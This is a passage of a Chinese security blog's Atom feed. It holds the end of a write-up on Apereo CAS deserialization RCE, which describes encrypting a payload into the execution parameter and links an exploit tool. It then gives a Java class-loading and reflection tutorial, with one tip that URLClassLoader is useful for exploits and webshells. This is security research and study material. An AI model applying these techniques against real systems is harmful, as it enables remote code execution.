class="line">&#125;</span><br></pre></td></tr></table></figure><br> <strong>小结</strong>：调试发现，反序列化execution参数的_后面部分，该部分是加密的。</p></li></ol><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>经过上述分析，需要对要反序列化的代码进行加密，base64加密，将处理后的数据加入到execution参数中。<br>利用工具 <a href="https://github.com/nice0e3/Cas_Exploit">https://github.com/nice0e3/Cas_Exploit</a>.<br>Ref:</p><ul><li><a href="https://www.00theway.org/2020/01/04/apereo-cas-rce/">https://www.00theway.org/2020/01/04/apereo-cas-rce/</a></li><li><a href="https://www.anquanke.com/post/id/198842">https://www.anquanke.com/post/id/198842</a></li><li><a href="https://www.cnblogs.com/nice0e3/p/14820166.html">https://www.cnblogs.com/nice0e3/p/14820166.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CAS-反序列化&quot;&gt;&lt;a href=&quot;#CAS-反序列化&quot; class=&quot;headerlink&quot; title=&quot;CAS 反序列化&quot;&gt;&lt;/a&gt;CAS 反序列化&lt;/h1&gt;&lt;h2 id=&quot;1-部署war包&quot;&gt;&lt;a href=&quot;#1-部署war包&quot; class=&quot;head</summary>
      
    
    
    
    
    <category term="Java" scheme="http://che35tnut.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java安全基础</title>
    <link href="http://che35tnut.github.io/2021/08/25/210825-Java-Security-Basic1/"/>
    <id>http://che35tnut.github.io/2021/08/25/210825-Java-Security-Basic1/</id>
    <published>2021-08-25T07:40:15.000Z</published>
    <updated>2022-10-12T11:31:08.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-Java基础"><a href="#1-Java基础" class="headerlink" title="1.    Java基础"></a>1.    Java基础</h1><p>Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言,Java程序在运行前需要先编译成class文件,classLoader加载该class到JVM内存区中,执行该程序.<br>编写一个简单的java类.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.chestnut;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestHelloworld</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-1-Java类加载"><a href="#1-1-Java类加载" class="headerlink" title="1.1  Java类加载"></a>1.1  Java类加载</h2><h3 id="1-1-1-类加载器"><a href="#1-1-1-类加载器" class="headerlink" title="1.1.1   类加载器"></a>1.1.1   类加载器</h3><p>种类</p><table><thead><tr><th>名称</th><th>备注</th><th>使用场景</th></tr></thead><tbody><tr><td>Bootstrap ClassLoader(引导类加载器)</td><td>最顶层的加载器,是JVM的一部分.</td><td>将存放在<code>＜JAVA_HOME＞\lib</code>目录中的，或者被-Xbootclasspath参数所指定的路径中的，并且是虚拟机识别的（仅按照文件名识别，如rt.jar，名字不符合的类库即使放在lib目录中也不会被加载）类库加载到虚拟机内存中。</td></tr><tr><td>Extension ClassLoader(扩展类加载器)</td><td></td><td>加载<code>＜JAVA_HOME＞\lib\ext</code>目录中的，或者被<code>java.ext.dirs</code>系统变量所指定的路径中的所有类库</td></tr><tr><td>App ClassLoader(系统类加载器)</td><td>默认加载器</td><td>加载用户类路径（ClassPath）上所指定的类库</td></tr></tbody></table><p>方法</p><table><thead><tr><th>方法名</th><th>功能</th></tr></thead><tbody><tr><td>loadClass</td><td>加载制定的Java类</td></tr><tr><td>findClass</td><td>查找指定的Java类</td></tr><tr><td>findLoadedClass</td><td>查找JVM已经加载过的类</td></tr><tr><td>defineClass</td><td>定义一个Java类</td></tr><tr><td>resolveClass</td><td>链接置顶的Java类</td></tr></tbody></table><p><font color="red">注意  </font><br>获取一些类的类加载器时可能返回null,即<font color="blue"> 该类的类加载器为Bootstrap ClassLoader(引导类加载器),因为Bootstarp ClassLoader位于JVM层. </font>例如:<code>java.io.File.class.getClassLoader()</code>将返回一个null对象，因为java.io.File类在JVM初始化的时候会被Bootstrap ClassLoader(引导类加载器)加载(该类加载器实现于JVM层，采用C++编写)，我们在尝试获取被Bootstrap ClassLoader类加载器所加载的类的ClassLoader时候都会返回null。</p><p>Ref: </p><ul><li><a href="https://www.cnblogs.com/dw-haung/p/9876471.html">https://www.cnblogs.com/dw-haung/p/9876471.html</a></li><li><a href="https://blog.csdn.net/mocas_wang/article/details/107927451">https://blog.csdn.net/mocas_wang/article/details/107927451</a></li></ul><h3 id="1-1-2-显式加载类"><a href="#1-1-2-显式加载类" class="headerlink" title="1.1.2   显式加载类"></a>1.1.2   显式加载类</h3><h2 id="也可以理解为类动态加载-通常使用Java反射或者ClassLoader动态加载类对象-ClassForName主要功能-主要功能-Class-forName-xxx-xx-xx-返回的是一个类-Class-forName-xxx-xx-xx-的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段。该方法有两种形式：Class-forName-String-name-boolean-initialize-ClassLoader-loader-和-Class-forName-String-className-。第一种形式的參数-name表示的是类的全名；initialize表示是否初始化类。loader表示载入时使用的类载入器。另外一种形式则相当于设置了參数-initialize的值为-true。loader的值为当前类的类载入器-1-ClassForName-根据类名字返回一个-Class-大写的Class表示Class类-也是类的一种-与class关键字不一样-2-手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在同名-class的文件中-字节码文件-，比如创建一个Shapes类，编译Shapes类后就会创建其包含Shapes类相关类型信息的Class对象，并保存在Shapes-class字节码文件中。3-每个通过关键字class标识的类，在内存中有且只有一个与之对应的Class对象来描述其类型信息，无论创建多少个实例对象，其依据的都是用一个Class对象。4-Class类只存私有构造函数，因此对应Class对象只能有JVM创建和加载5-Class类的对象作用是运行时提供或获得某个对象的类型信息，这点对于反射技术很重要-关于反射稍后分析-。6-Class-newInstance-表示生成一个该类的实例化对象-只能使用默认构造器-无参数-Ref-https-blog-csdn-net-mocas-wang-article-details-107428506"><a href="#也可以理解为类动态加载-通常使用Java反射或者ClassLoader动态加载类对象-ClassForName主要功能-主要功能-Class-forName-xxx-xx-xx-返回的是一个类-Class-forName-xxx-xx-xx-的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段。该方法有两种形式：Class-forName-String-name-boolean-initialize-ClassLoader-loader-和-Class-forName-String-className-。第一种形式的參数-name表示的是类的全名；initialize表示是否初始化类。loader表示载入时使用的类载入器。另外一种形式则相当于设置了參数-initialize的值为-true。loader的值为当前类的类载入器-1-ClassForName-根据类名字返回一个-Class-大写的Class表示Class类-也是类的一种-与class关键字不一样-2-手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在同名-class的文件中-字节码文件-，比如创建一个Shapes类，编译Shapes类后就会创建其包含Shapes类相关类型信息的Class对象，并保存在Shapes-class字节码文件中。3-每个通过关键字class标识的类，在内存中有且只有一个与之对应的Class对象来描述其类型信息，无论创建多少个实例对象，其依据的都是用一个Class对象。4-Class类只存私有构造函数，因此对应Class对象只能有JVM创建和加载5-Class类的对象作用是运行时提供或获得某个对象的类型信息，这点对于反射技术很重要-关于反射稍后分析-。6-Class-newInstance-表示生成一个该类的实例化对象-只能使用默认构造器-无参数-Ref-https-blog-csdn-net-mocas-wang-article-details-107428506" class="headerlink" title="也可以理解为类动态加载,通常使用Java反射或者ClassLoader动态加载类对象.ClassForName主要功能:主要功能:Class.forName(xxx.xx.xx)返回的是一个类, Class.forName(xxx.xx.xx) 的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段。该方法有两种形式：Class.forName(String name, boolean initialize, ClassLoader loader)和 Class.forName(String className)。第一种形式的參数 name表示的是类的全名；initialize表示是否初始化类。loader表示载入时使用的类载入器。另外一种形式则相当于设置了參数 initialize的值为 true。loader的值为当前类的类载入器.1. ClassForName(),根据类名字返回一个 Class(大写的Class表示Class类,也是类的一种,与class关键字不一样.)2. 手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在同名.class的文件中(字节码文件)，比如创建一个Shapes类，编译Shapes类后就会创建其包含Shapes类相关类型信息的Class对象，并保存在Shapes.class字节码文件中。3. 每个通过关键字class标识的类，在内存中有且只有一个与之对应的Class对象来描述其类型信息，无论创建多少个实例对象，其依据的都是用一个Class对象。4. Class类只存私有构造函数，因此对应Class对象只能有JVM创建和加载5. Class类的对象作用是运行时提供或获得某个对象的类型信息，这点对于反射技术很重要(关于反射稍后分析)。6. Class.newInstance()表示生成一个该类的实例化对象,只能使用默认构造器,无参数.Ref: https://blog.csdn.net/mocas_wang/article/details/107428506"></a>也可以理解为类动态加载,通常使用Java反射或者ClassLoader动态加载类对象.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反射加载类</span></span><br><span class="line"><span class="type">TestHelloworld</span> <span class="variable">testHelloworld</span> <span class="operator">=</span> (TestHelloworld) Class.forName(<span class="string">&quot;com.chestnut.TestHelloworld&quot;</span>).newInstance();</span><br><span class="line">System.out.println(testHelloworld.hello());</span><br></pre></td></tr></table></figure><br>ClassForName主要功能:主要功能:Class.forName(xxx.xx.xx)返回的是一个类, Class.forName(xxx.xx.xx) 的作用是要求JVM查找并加载指定的类，也就是说JVM会执行该类的静态代码段。<br>该方法有两种形式：Class.forName(String name, boolean initialize, ClassLoader loader)和 Class.forName(String className)。<br>第一种形式的參数 name表示的是类的全名；initialize表示是否初始化类。loader表示载入时使用的类载入器。<br>另外一种形式则相当于设置了參数 initialize的值为 true。loader的值为当前类的类载入器.<br>1. ClassForName(),根据类名字返回一个<font color="red"> Class</font>(大写的Class表示Class类,也是类的一种,与class关键字不一样.)<br>2. 手动编写的类被编译后会产生一个Class对象，其表示的是创建的类的类型信息，而且这个Class对象保存在同名.class的文件中(字节码文件)，比如创建一个Shapes类，编译Shapes类后就会创建其包含Shapes类相关类型信息的Class对象，并保存在Shapes.class字节码文件中。<br>3. 每个通过关键字class标识的类，在内存中有且只有一个与之对应的Class对象来描述其类型信息，无论创建多少个实例对象，其依据的都是用一个Class对象。<br>4. Class类只存私有构造函数，因此对应Class对象只能有JVM创建和加载<br>5. Class类的对象作用是运行时提供或获得某个对象的类型信息，这点对于反射技术很重要(关于反射稍后分析)。<br>6. <code>Class.newInstance()</code>表示生成一个该类的实例化对象,只能使用默认构造器,无参数.<br>Ref: <a href="https://blog.csdn.net/mocas_wang/article/details/107428506">https://blog.csdn.net/mocas_wang/article/details/107428506</a></h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ClassLoader 加载类</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.chestnut.TestHelloworld&quot;</span>).newInstance();</span><br></pre></td></tr></table></figure><p>ClassLoader 加载类的流程如下:</p><ol><li>ClassLoader会调用public Class&lt;?&gt; loadClass(String name)方法加载com.anbai.sec.classloader.TestHelloWorld类。</li><li>调用findLoadedClass方法检查TestHelloWorld类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前ClassLoader时传入了父类加载器(new ClassLoader(父类加载器))就使用父类加载器加载TestHelloWorld类，否则使用JVM的Bootstrap ClassLoader加载。</li><li>如果上一步无法加载TestHelloWorld类，那么调用自身的findClass方法尝试加载TestHelloWorld类。</li><li>如果当前的ClassLoader没有重写了findClass方法，那么直接返回类加载失败异常。如果当前类重写了findClass方法并通过传入的com.anbai.sec.classloader.TestHelloWorld类名找到了对应的类字节码，那么应该调用defineClass方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类,默认为false。</li><li>返回一个被JVM加载后的java.lang.Class类对象。<br><font color="blue"> 注意以下下几个问题后就能搞懂ClassLoader加载类的流程:<br>类是否初始化? 调用什么加载器? 加载器无法加载怎么办? 是否还有别的注意事项?</font></li></ol><p><strong>总结:</strong> Class.forName()得到的class是已经初始化完成的。<br>Classloader.loaderClass得到的class是还没有链接（验证，准备，解析三个过程被称为链接）的。</p><p><strong>Tips:</strong> URLClassLoader可以远程加载资源,写漏洞活着webshell时可以,使用它实现远程的类方法调用. </p><h3 id="1-1-3-隐式加载类"><a href="#1-1-3-隐式加载类" class="headerlink" title="1.1.3   隐式加载类"></a>1.1.3   隐式加载类</h3><p>通常是指类名.方法名()或<code>new</code>一个类的实例.在代码中编写,编译Java程序时就自动的加载到JVM中.</p><h2 id="1-2-Java反射"><a href="#1-2-Java反射" class="headerlink" title="1.2 Java反射"></a>1.2 Java反射</h2><h3 id="1-2-1-概念"><a href="#1-2-1-概念" class="headerlink" title="1.2.1 概念"></a>1.2.1 概念</h3><ol><li><p>反射机制是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法。</p></li><li><p>反射可以在一个类运行的时候获取类的信息的机制，可以获取在编译期不可能获得的类的信息。</p></li><li><p>对于任意一个对象，都能调用它的任意一个方法和属性。</p></li><li><p>因为类的信息是保存在Class对象中的，而这个Class对象是在程序运行时被类加载器（ClassLoader）动态加载的。</p></li><li><p>当类加载器装载运行了类后，动态获取Class对象的信息以及动态操作Class对象的属性和方法的功能称为Java语言的反射机制.</p></li></ol><p>Java反射就是在运行状态中，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意方法和属性；并且能改变它的属性。</p><h2 id="1-2-2-利用反射获取Class的三种方式"><a href="#1-2-2-利用反射获取Class的三种方式" class="headerlink" title="1.2.2 利用反射获取Class的三种方式"></a>1.2.2 利用反射获取Class的三种方式</h2><p>测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">testClassEqual</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// 1.调用getClass()方法来获取，通常应用在不知道：不知道实例化的对象具体是什么类的情况下。</span></span><br><span class="line">    <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> student.getClass();</span><br><span class="line">    <span class="comment">// 2.通过类名.class 方式获取，安全可靠，性能高。</span></span><br><span class="line">    <span class="comment">// 说明任何一个类都有一个隐含的成员变量 class。</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span> Student.class;</span><br><span class="line">    <span class="comment">// 3.通过Class类的forName方法获取，最常用。容易抛出异常ClassNotFoundException。</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c3</span> <span class="operator">=</span><span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        c3 = Class.forName(<span class="string">&quot;com.chestnut.reflection.Student&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(c1.equals(c2));</span><br><span class="line">    System.out.println(c1.equals(c3));</span><br><span class="line">    System.out.println(c2.equals(c3));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><blockquote><p>True<br>True<br>True</p></blockquote><p>可以看出三种方法获取的Class类都是相同的。</p><h3 id="1-2-3-Class类的主要方法"><a href="#1-2-3-Class类的主要方法" class="headerlink" title="1.2.3 Class类的主要方法"></a>1.2.3 Class类的主要方法</h3><pre><code>getName():获取类的完整名字。getFields()：获取类的public属性。getDeclareFileds():获取类的所有属性。包括private和继承类。getMethods(): 获取类的public方法。getDeclaredMethods():获取类的所有方法。包括private和继承类。getMethod(String name, Class[] parameterTypes)：获得类的特定方法，name参数指定方法的名字，parameterTypes 参数指定方法的参数类型。getConstructors()：获得类的public类型的构造方法。getConstructor(Class[] parameterTypes)：获得类的特定构造方法，parameterTypes 参数指定构造方法的参数类型。newInstance()：通过类的构造方法创建这个类的一个对象。</code></pre><p><strong>总结</strong>：反射就是把java类中的各种成分映射成一个个的Java对象，并且可以进行操作。</p><p>Ref:</p><ul><li><a href="https://blog.csdn.net/qq_24549805/article/details/104013083">https://blog.csdn.net/qq_24549805/article/details/104013083</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-Java基础&quot;&gt;&lt;a href=&quot;#1-Java基础&quot; class=&quot;headerlink&quot; title=&quot;1.    Java基础&quot;&gt;&lt;/a&gt;1.    Java基础&lt;/h1&gt;&lt;p&gt;Java是一个依赖于JVM(Java虚拟机)实现的跨平台的开发语言,Java</summary>
      
    
    
    
    
  </entry>
  
</feed>
